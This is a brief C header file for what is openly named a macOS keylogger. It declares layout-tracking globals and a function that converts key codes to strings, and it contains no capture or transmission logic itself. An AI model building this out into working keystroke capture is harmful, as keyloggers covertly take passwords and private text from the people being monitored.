#ifndef KEYLOGGER_H_
#define KEYLOGGER_H_

#include <ApplicationServices/ApplicationServices.h>
#include <stdbool.h>
#include <string.h>

// Global Variables
bool layout_switch;
bool autoread;
char layout[256];

// keyCodeToString.c
extern char * keycodeToString (CGKeyCode);

#endif
